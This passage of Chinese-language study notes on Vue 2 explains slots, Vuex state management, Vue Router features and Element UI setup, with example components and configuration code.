  }
  video{
    width: 300px;
  }
</style>
```

*List.vue*
```html
<template>
  <div class="list">
    <h1>{{title}}</h1>
    <slot>
      <h2>我是默认值</h2>
    </slot>
  </div>
</template>

<script>
  export default {
    name: "List",
    props: ["title"]
  }
</script>

<style scoped>
  .list{
    background-color: skyblue;
    width: 300px;
    height: 400px;
  }
  h1{
    background-color: orange;
    text-align: center;
  }
</style>
```

### 16.2 name属性 具名插槽

* 一个组件拥有多个插槽, 需要给每个`slot`标签添加`name`属性
* 父元素插入标签通过`slot`属性插入相应插槽
* `template`标签可以批量添加属性, **并且使用`template`可以用`v-slot:name值(无引号)`**

*List.vue的模版*
```html
<template>
  <div class="list">
    <h1>{{title}}</h1>
    <slot name="center">
      <h2>我是默认值</h2>
    </slot>
    <slot name="footer">
      <h2>我是默认值</h2>
    </slot>
  </div>
</template>
```

*app.vue的模版*
```html
<template>
  <div class="app">
    <List title="美食分类">
      <img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="" slot="center">
      <a href="#" slot="footer">更多美食</a>
    </List>

    <List title="游戏分类">
      <ul slot="center">
        <li v-for="(item,index) in contents" :key="index" >{{item}}</li>
      </ul>
      <template v-slot:footer>
        <div slot="footer" class="foot">
          <a href="#">单机游戏</a>
          <a href="#">网络游戏</a>
        </div>
      </template>
    </List>

    <List title="电影分类">
      <video src="http://vjs.zencdn.net/v/oceans.mp4" controls slot="center"></video>
      <template v-slot:footer>
        <div  class="foot">
          <a href="#">热门</a>
          <a href="#">经典</a>
          <a href="#">推荐</a>
        </div>
        <h4 class="center">欢迎前来观影</h4>
      </template>
      
      
    </List>
  </div>
</template>
```

### 16.3 scope 作用域插槽

* 适用于数据在子组件, 父组件的插入标签需要子组件的的数据
* 子组件的`slot`的**自定义参数**, 可以传到其使用者处, 如`:data="contents"`
* 父组件处插入标签时要有`templete`包裹, 属性`scope`可以接到数据**对象** `scope="d"`
* 而后可以使用子组件的数据`v-for(item in d.data)` *注意对象和属性的关系*, 可以采用结构赋值`scope="{data}"` `v-for(item in data)`

*app.vue的模版*
```html
<template>
  <div class="app">

    <List title="游戏分类">
      <template scope="d">
        <ul>
          <li v-for="(item,index) in d.data" :key="index" >{{item}}</li>
        </ul>
      </template>
    </List>

    <List title="游戏分类">
      <template scope="d">
        <ol>
          <li v-for="(item,index) in d.data" :key="index" >{{item}}</li>
        </ol>
      </template>
    </List>

    <List title="游戏分类">
      <template scope="d">
        <h4 v-for="(item,index) in d.data" :key="index" >{{item}}</h4>
      </template>
    </List>

  </div>
</template>
```

*List.vue*
```html
<template>
  <div class="list">
    <h1>{{title}}</h1>
    <slot :data="contents">默认值</slot>
  </div>
</template>

<script>
  export default {
    name: "List",
    data() {
      return {
        contents: ["红色警戒", "穿越火线", "超级玛丽", "劲舞团"],
      }
    },
    props: ["title"]
  }
</script>

<style scoped>
  .list{
    background-color: skyblue;
    width: 300px;
    height: 400px;
  }
  h1{
    background-color: orange;
    text-align: center;
  }
  
</style>
```

## 拾柒 Vuex

https://github.com/vuejs/vuex

*在Vue中实现集中式状态数据管理的一个Vue插件*

*适用于任意组件间通信*

**用于多个组件依赖同一状态/数据**
**来自不同组件的行为需要更改同一状态**

### 17.1 store Vuex的工作原理

* Vuex在`store`的管辖下, 分为三个部分`actions`, `mutations`, `state`
* 其中`state`负责存放共享的数据
* 当需要修改数据时
  1. 首先在组件中调用`dispatch`传递**操作类型**和**操作数据**给`actions`
  2. 然后`actions`调用`commit`传递**操作类型**和**数据**给`mutations`
  3. 最后`mutations`完成对`state`中数据的加工修改
  4. `state`中数据的修改**会导致页面重新渲染**
* `actions`存在的意义是还可以在只传递**操作类型**, 而没有**数据**的情况下, **向后端请求数据**
* `mutations`可以连接Vuex的开发者工具


### 17.2 搭建Vuex开发环境

*Vue2需要使用3版本 Vue3需要使用4版本*

* 安装
>npm install vuex@3 --save
* 配置目录
> src > store > index.js
* `index.js`中创建`store` 
  * 在创建前**本文件**使用插件`Vue.use(Vuex)`(引入`Vue`, `Vuex`)
  * 暴露`new Vuex.Store({actions.., mutations.., state..})`
* 使用
  * vm导入并传入`store`

*src/store/index.js*
```js
import Vue from 'vue';
import Vuex from "vuex"

Vue.use(Vuex)

// 准备 actions 用于响应组件中的动作
const actions = {}
// 准备 mutations 用于操作数据(state)
const mutations = {}
// 准备 state 用于存储数据
const state = {}

// 创建 暴露 store
export default new Vuex.Store({actions, mutations, state})
```

*main.js*
```js
import Vue from 'vue'
import App from './App'

Vue.config.productionTip = false

import store from './store' // index.js 可以省略

const vm = new Vue({
  el: "#app",
  render: h => h(App),
  store
})

console.log(vm);
```

### 17.3 $store 使用Vuex

* 在组件中使用`组件实例.$store.dispatch(操作名, 数据)`向`actions`传递数据
* 当不需要业务逻辑时, 可以直接`组件实例.$store.commit(操作名, 数据)`向`mutations`传递数据
* 使用`组件实例.$store.state.数据`获取数据
* `store/index.js`中`store`实例配置对象的`state`配置项中存放对应数据
* `actions`配置项存放业务操作(不修改数据, 只处理需要的逻辑), 并调用`context.commit(操作名, 数据)`
  * 每项操作为一个函数`操作名(context, value){... context.commit..}`
    * `context` 为**上下文**, 可以看着一个小型的`$store`, 有`commit, state`等属性 也可以`context.dispatch`继续交给其他的`actions`继续处理
    * `value` 由组件传递来的数据
* `mutations`配置项存放对state进行直接的修改函数
  * `操作名(state, value)`
    * 操作名通常全为大写
    * `state` 即为存放数据的位置, `state.数据 = `修改数据
    * `value` 由组件或者`actions` commit得到的数据


*Count.vue*
```html
<template>
  <div>
    <h1>当前求和为{{$store.state.sum}}</h1>
    <select v-model="select">
      <option :value="1">1</option>
      <option :value="2">2</option>
      <option :value="3">3</option>
    </select>
    <button @click="add">+</button>
    <button @click="red">-</button>
    <button @click="whenSiAdd">当前和为奇数再加</button>
    <button @click="waitAdd">等一等再加</button>
  </div>
</template>

<script>
  export default {
    name: "Count",
    data() {
      return {
        select: 1
      }
    },
    methods: {
      add(){
        // this.$store.dispatch("add", this.select)
        this.$store.commit("ADD", this.select)
      },
      red(){
        // this.$store.dispatch("red", this.select)
        this.$store.commit("RED", this.select)
      },
      whenSiAdd(){
        this.$store.dispatch("addOdd", this.select)
      },
      waitAdd(){
        this.$store.dispatch("addWait", this.select)
      }
    }
  }
</script>
```

*store/index.js*
```js
import Vue from 'vue';
import Vuex from "vuex"

Vue.use(Vuex)

export default new Vuex.Store({
  actions: {
    // add(context, value){
    //   console.log("actions 中的 add 被调用了");
    //   context.commit("ADD", value)
    // },
    // red(context, value){
    //   context.commit("RED", value)
    // },
    addOdd(context, value){
      if(context.state.sum % 2) context.commit("ADD", value)
    },
    addWait(context, value){
      setTimeout(() => {
        context.commit("ADD", value)
      }, 500)
    }
  }, 
  mutations: {
    ADD(state, value){
      console.log("mutations 中的 ADD 被调用了");
      state.sum += value
    },
    RED(state, value){
      state.sum -= value
    }
  },
  state: {
    sum: 0
  }
})
```

### 17.4 store中的getters配置项 store的"计算属性"

* 相等于组件中`computed`计算属性的地位, 可以计算`state`中的属性供其它组件使用
* `getters`中的每一项 `数据名(state){return ..}`
* 组件访问`组件实例.$store.getters.数据`

*store实例*
```js
...
state: {
    sum: 0
},
getters: {
  bigSum(state){
    return state.sum * 10
  }
}
```

*组件中使用*
```html
...
<h1>当前求和为{{$store.state.sum}}</h1>
<h1>当前求和放大十倍为{{$store.getters.bigSum}}</h1>
```

### 17.4 mapState mapGetters 自动生成computed以简化模版代码

* 从`state`中取数据用于模版要写成`$store.state.sum`这种复杂的形式, 可以通过计算属性`sum(){return this.$store.state.sum}`来简化模版的操作
* 而`mapState`和`mapGetters`就可以批量生成这些计算属性
* 导入`import {mapState, mapGetters} from "vuex"`
* **自定义计算属性名** 用对象写法 `...mapState({he: "sum", xueke: "subject", bigSum: "bigSum"}),`, 这样就生成了属性名为`he``xueke``bigSum`的对应到`this.$store.mapState.sum`...的三个计算属性
* **不更改属性名** 用数组写法 `...mapState(["sum", "subject", "bigSum"]),`

*组件的计算属性*
```js
computed: {
  // sum(){
  //   return this.$store.state.sum
  // },
  // school(){
  //   return this.$store.state.school
  // },
  // subject(){
  //   return this.$store.state.subject
  // },
  // bigSum(){
  //   return this.$store.getters.bigSum
  // },
  ...mapState({sum: "sum", school: "school", subject: "subject"}),
  ...mapGetters({bigSum: "bigSum"})
},
```

### 17.5 mapActions mapMutations 自动生成methods

* `methods`中向`actions`和`mutations`提交数据往往只有一句代码`this.$store.dispatch(..)`或者`this.$store.commit(..)`
* `mapActions` `mapMutations` 用于批量生成这样的方法
* 对象写法 `...mapActions({方法名: "操作方法",...}),` 会生成调用`dispatch`的函数`方法名(val){this.$store.dispatch(操作方法, val)}`, **注意这样写需要在用到此方法的地方传入提交数据`val`**
* 也可以用数组写法 表示不更改方法名

*模版处*
```html
<button @click="add(select)">+</button>
<button @click="red(select)">-</button>
<button @click="whenSiAdd(select)">当前和为奇数再加</button>
<button @click="waitAdd(select)">等一等再加</button>
```

*methods配置项*
```js
methods: {
/*add(){
  // this.$store.dispatch("add", this.select)
  this.$store.commit("ADD", this.select)
},
red(){
  // this.$store.dispatch("red", this.select)
  this.$store.commit("RED", this.select)
},*/
...mapMutations({add: "ADD", red: "RED"}),
/*whenSiAdd(){
  this.$store.dispatch("addOdd", this.select)
},
waitAdd(){
  this.$store.dispatch("addWait", this.select)
}*/
...mapActions({whenSiAdd: "addOdd", waitAdd: "addWait"})
},
```

### 17.6 Vuex 模块化 需要补充----

## 拾捌 路由插件 Vue-Router

https://router.vuejs.org/zh/

*用于构建单页面应用*

*把路径和组件对应起来*

### 18.1 router-link router-view 路由基本使用

* 安装 *4版本只能vue3使用 vue需要使用3版本*
>npm i vue-router@3
* 引入并定义路由
  * *router/index.js*中引入
  >import VueRouter from "vue-router"
  >import Vue from "vue"
  >Vue.use(VueRouter) 
  * 向外暴露路由实例 *注意引入需要的组件*
  > export default new VueRouter({route: [{path: .., component:..}, {path..}..]})
* 使用
  * *main.js*中引入路由 `import router from "./router"`
  * 在`vm`配置对象中引入配置项`router`
  * 在`App.vue`中相应导航位置用`router-link`替代`a`标签的位置
    * `to`属性表示目标路径, 如`/home`
    * `active-class`属性表示选中时应用类名
  * 在不同路径替换的组件处用`<router-view></router-view>`占位, 路由会自动用路径对应组件替代此标签

*router/index.js*
```js
import Vue from 'vue'
import VueRouter from 'vue-router'

import About from '../components/About'
import Home from '../components/Home'

Vue.use(VueRouter)

export default new VueRouter({
  routes: [
    {
      path: '/about',
      component: About
    },
    {
      path: '/home',
      component: Home
    }
  ]
})
```

*App.vue的模版*
```html
<template>
  <div>
    <div class="row">
      <div class="offset-2 col-8">
        <div class="page-header">
          <h2>Vue Router Demo</h2>
        </div>
      </div>
    </div>
    <div class="row">
      <div class="col-2 offset-2">
        <div class="list-group">
          <router-link to="/about" class="list-group-item" active-class="active">About</router-link>
          <router-link to="/home" class="list-group-item" active-class="active">Home</router-link>
        </div>
      </div>
      <div class="col-6">
        <div class="panel">
          <div class="panel-body">
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
```

**注意**

* 一般把**路由组件**放在*pages*文件夹
* **不用的路由组件被销毁了**


### 18.2 children配置项 嵌套路由

* 在`router/index.js`中相应父路由配置规则下和`path`, `component`同级的配置项`children`为一个数组, 内部也可以包含多个配置规则对象代表子路由, **注意除了一级路由的`path`有`\`, 其余没有`\`**
* 在父路由组件中同样使用`router-link`, `router-view`, **注意路径`to`属性要包含父路由路径**

*router/index.js的路由对象*
```js
export default new VueRouter({
  routes: [
    {
      path: '/about',
      component: About
    },
    {
      path: '/home',
      component: Home,
      children: [
        {
          path: 'news',
          component: News
        },
        {
          path: 'message',
          component: Message
        }
      ]
    },
    {
      path: '/home/message',
      component: Message
    },
    {
      path: '/home/news',
      component: News
    }
  ]
})
```

*父路由模版*
```html
<template>
  <div>
    <h2>Home组件内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link to="/home/news" class="list-group-item" active-class="active" >News</router-link>
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link>
        </li>
      </ul>
      <router-view></router-view>
    </div>
  </div>
</template>
```

### 18.3 向路由组件传递参数 query方式

* 同一路由组件, 但是由于由不同组件或方式跳转而来, 展示内容有所不同, 可以用参数方式传递数据

* 父组件处

router-link to属性对象写法 **常用**
```js
:to="{
path: '/home/message/detail',
query: {
  id: m.id,
  title: m.title
}"
```

字符串写法 
```html
<router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>
```

* 子组件处使用`this.$route.query`获取传来的参数

### 18.4 命名路由 name属性

* 可以简化**路径过长时**router-link`to`属性中的`path`
* 在`router/index.js`中对应的路由赋予属性`name`, 一般属性值即为小写的路由名
* 而后在跳转到该组件时, 即可在`to`中使用`name`属性代替`path`属性, 但是*只能应用于to属性的对象格式*

### 18.5 向路由组件传递参数 params方式

* 父组件处

router-link to字符串写法 **常用**

```html
<router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>
```

对象写法 **注意使用对象写法传递params不能用path, 要用name**
```js
:to="{
  name: 'xiangqing',
  params: {
    id: m.id,
    title: m.title
  }
}"
```

* `router/index.js`中 在相应路由`path`中写上占位路径`'detail/:id/:title'`


* 子组件使用`this.$route.params`获取传递到的`params`参数

### 18.6 路由的props配置项 使得路由组件以更加简洁的方式使用接受的参数

`router/index.js`中相应路由的`props`属性
* 对象写法 该对象中所有key-value会以props传给Detail `props: {a: 1, b: "hello"}` **少用, 只能传递固定值**
* 布尔值写法 会把该路由组件收到的所有 **params** 参数以 props 的形式传给 Detail 组件, 在接收使用即可直接使用，无需`$route.params.xx` 使用`props: true`
* 函数写法, 既可以处理 **params**参数也可处理**query**传参, `props($route){return {id: $route.query.id, title: $route.query.title}}`会接收到`$route`把返回值对象中所有key-value会以props传给Detail **常用**

### 18.6 router-link replace属性 开启历史记录replace模式

#### 18.6.1 浏览器历史记录工作原理

##### push模式 *默认*

* 每次点击新路由会向**栈**中加入一个新地址, 指针停留在栈顶
* 后退: 指针下移一位, 到达指针所在地址
* 前进: 指针上移一位, 到达指针所在地址

##### replace模式

* 跳转到应用了replace模式下的新路由**替换掉**旧的地址
* 因此不能后退至其跳转前的地址, 而是**后退两级**

#### router-link replace属性

添加后开启历史记录replace模式


### 18.7 this.$router 编程式路由导航

#### 18.7.1 编程式路由导航实现自定义跳转

* 在开发中可能不同用`a`标签, 而要采用`button`来实现样式, 也可能要实现, 点击路由先进行某些操作, 后跳转, 这时候不能使用`router-link`标签, 使用编程式路由导航
* 实际上就是在组件中的某些地方自定义的跳转, 通过`this.$router.push({..})`或者`this.$router.replace({..})`实现两种模式的路由, 其中传入的对象为写成`router-link`标签的对象格式`to`属性

```html
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id" @click="">
        <!-- 跳转路由并携带params参数, to字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link> -->
        <!-- to对象写法 -->
        <router-link :to="{
          name: 'xiangqing',
          query: {
            id: m.id,
            title: m.title
          }
        }">
          {{m.title}}
        </router-link>
        <button @click="pushShow(m)">push查看</button>
        <button @click="replaceShow(m)">replace查看</button>
      </li>
    </ul>
    <hr>
    <router-view></router-view>
  </div>
</template>

<script>
  export default {
    name: "Message",
    data() {
      return {
        messageList: [
          {id: '001', title: '消息001'},
          {id: '002', title: '消息002'},
          {id: '003', title: '消息003'},
        ]
      }
    },
    methods: {
      pushShow(m){
        this.$router.push({
          name: 'xiangqing',
          query: {
            id: m.id,
            title: m.title
          }
        })
      },
      replaceShow(m){
        this.$router.replace({
          name: 'xiangqing',
          query: {
            id: m.id,
            title: m.title
          }
        })
      }
    },
  }
</script>
```

#### 18.7.2  编程式路由导航实现后退前进

* `this.$router.back()`
* `this.$router.forward()`
* `this.$router.go(x)` x为整数 正则前进x步 负则后退abs(x)步

### 18.8 keep-alive 缓存路由组件

* 没出现在路径的路由组件会被销毁, 因此重新跳转(后退前进)会被重新生成挂载, 对于一些表单信息可能会体验感不加
* 可以在此组件绘制的区域`<router-view></router-view>`处用`Keep-alice`标签包裹, `include`属性为保活的**组件名**(多个可以动态写成数组), 如不写`include`保活所有绘制于此处的组件
* 保活的组件不会被销毁

```html
<keep-alive include="News">
  <router-view></router-view>  
</keep-alive>
```

### 18.9 activated deactivated 路由组件特有的生命周期钩子

* 相当于`mounted`和`beforedestroy`的关系
* 展示组件调用`activated`, 切走调用`deactivated`
* 对被保活(缓存)的组件依然生效

### 18.10 路由守卫

* 限定路由的权限, 不可随意跳转, 满足一定要求后才能调整

#### 18.10.1 router.beforeEach 前置守卫

* `router.beforeEach((to from next) => {if..next()})`
* 回调函数在路由切换**前**时以及初始化时调用
  * `to` 目标路由 包含`name`(有的话), `path`完整路径如`/home/message`
  * `from` 来源路由
  * `next` 函数, 只有调用`next()`意味允许切换, 据此进行权限控制
* 判断某一个路由组件是否需要权限校验, 可以给这个路由添加一个**自定义标志信息**, 而`router/index.js`中路由配置对象中每一个路由的配置属性`meta`可以传入自定义属性, 
  * `{path..name..meta: {isAuth:true}}`, 对于不需要检验的路由无需添加
  * 在`router.beforeEach`的回调中`if(to.meat.isAuth) // 需要鉴权`

*router/index.js的router.beforeEach*

```js
router.beforeEach((to, from, next) => {
  console.log(to);
  console.log(from);
  next()
})
```

#### 18.10.2 router.afterEach 后置守卫

* `router.afterEach((to, from)=>{})`
* 在切换完成后调用回调, 如不放行不会进行
* 可以配合`meta`自定义属性进行如切换路由后修改标题`document.title = ..`这种操作

#### 18.10.3 beforeEnter 配置属性 独享路由守卫

* 单独给某个路由组件配置路由守卫, 和`path`, `name`, `meta`同级
* `beforeEnter((to, from, next) => {...next()})`
* **只有前置**

#### 18.10.4 组件内路由守卫

* 写在组件内
* 待补充

### 18.11 hash history 路由工作模式

* `#`代表着hash, 其后的信息不会作为路径发往服务器
* 切换工作模式, 在路由的配置对象中添加属性`mode`, 属性值`history`/`hash`(默认)
* `hash`模式兼容性好
* `history` **常用** 模式兼容性略差, 部署后刷新有404的问题, 需要后端配合, `connect-history-api-fallback`包

node.js
> npm i connect-history-api-fallback
> // 在静态资源前
> const history = require('history')
> app.use(history())

## 打包 -> html js css

> npm run build

生成项目目录 `dist`

把目录交给`express.static`静态托管即可



## 十九 Element UI PC端常见VueUI组件库

*适合用于不需要高度定制化的网站*

https://element.eleme.cn/#/zh-CN

### 19.1 Vue.use引入

> npm i element-ui -S

`main.js`中
```js
import ElementUI from 'element-ui';
import 'element-ui/lib/theme-chalk/index.css';

Vue.use(ElementUI);
```

* 后查看文档好看的组件CV

*引入了所有的样式和组件, 占用内存很大*

### 19.2 按需引入

* 使用babel-plugin-component

>npm install babel-plugin-component -D

修改`babel.config.js`

* `"presets"`中**追加**`["@babel/preset-env", { "modules": false }]`
添加属性(和`"presets"`同级)
```json
 "plugins": [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
```

按需引入组件
```js
import { Button, Select } from 'element-ui';
// import的应为 el-xxx的Xxx

Vue.component(Button.name, Button); // 第一个参数为名字, 使用组件标签时用的是 name 属性
Vue.component(Select.name, Select);
```

样式会自动引入